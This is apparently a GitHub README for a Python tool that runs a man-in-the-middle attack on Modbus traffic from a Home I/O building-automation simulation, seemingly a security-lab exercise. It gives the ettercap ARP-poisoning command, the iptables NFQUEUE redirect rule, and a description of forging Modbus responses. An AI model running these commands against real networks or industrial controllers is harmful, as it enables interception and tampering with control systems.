# Home IO Packet monitorer

This script is used to monitor the packets from Home IO simulation and modified them.
The [Modbus interface for Home I/O simulation](https://github.com/Klagarge/Modbus2HomeIO) and his [Controller](https://github.com/Klagarge/ControllerHomeIo) have to be used.

It uses the `scapy` library to read and modify the packets. Packet are get from the queue created by `iptables`.

This script have to be run on sudo mode on an MitM environment. (e.g. ARP poisoning with `ettercap`)

## Prerequisites
<p align="left">
<a href="https://www.kali.org/" target="_blank" rel="noreferrer"> <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2b/Kali-dragon-icon.svg/1200px-Kali-dragon-icon.svg.png" alt="kali linux" width="60" height="60"/> </a>
<a href="https://www.ettercap-project.org/" target="_blank" rel="noreferrer"><img src="https://www.kali.org/tools/ettercap/images/ettercap-logo.svg" alt="ettercap" width="60" height="60"/> </a>
<a href="https://linux.die.net/man/8/iptables" target="_blank" rel="noreferrer"><img src="https://projects.task.gda.pl/uploads/-/system/project/avatar/286/iptables-logo.png" alt="iptables" width="60" height="60"/> </a>
<a href="https://www.python.org" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg" alt="python" width="60" height="60"/> </a>
<a href="https://scapy.net/" target="_blank" rel="noreferrer"><img src="https://www.kali.org/tools/scapy/images/scapy-logo.svg" alt="scapy" width="60" height="60"/> </a>


The following components must be installed: 

- Ettercap
- iptables
- Python 3.8 or higher
- Scapy and netfilterqueue library 

Ettercap and iptables are installed by default on Kali Linux.
They can be installed on other Linux using apt:
 
```bash
sudo apt install ettercap-text-only iptables
```

The Scapy library can be installed using pip:
 
```bash
pip install scapy
```

The netfilterqueue library can be installed using pip:
 
```bash
pip install NetfilterQueue
```

## Usage
1. Modified the IP address in the `main.py` file
2. Run the python scrypt on sudo mode
   ```bash
   sudo python main.py
   ```
3. Start ARP poisoning with Ettercap (change the IP address):
   ```bash
   sudo ettercap -T -i eth0 -M arp /192.168.39.110// /192.168.37.163//
   ```
   exit with `q`
4. Put packet on queue for being modified by the Python script with: 
   ```bash
   sudo iptables -I OUTPUT -d 192.168.0.0/16 -j NFQUEUE --queue-num 1
   ```
   Return to normal mode with: 
   ```bash
   sudo iptables -F
   ```

## How it works
Ettercap is used to perform ARP poisoning and redirect the traffic to the attacker.
ARP poising involves sending ARP messages to the targets machine, for fake their correspondent and make them send their packets to the attacker.

Iptables is used to put the packets on a queue, so they can be modified by the Python script.
With the bash command we put only local network packets on the queue (`192.168.0.0/16`)

The Python script get the packets from the queue and analyse in deep if it's a TCP packet to modbus port and come from one target.
If packet is not analyse it is accepted and sent to the target.
If packet is deeply analyse, the script check if this is a request for the corresponding client id and adresse and put the transaction id on a list.
When this transaction id appear again, the script modify the packet to make it a response with the value the attacker want.


## Authors
- **Rémi Heredero** - _Initial work_ - [Klagarge](https://github.com/Klagarge)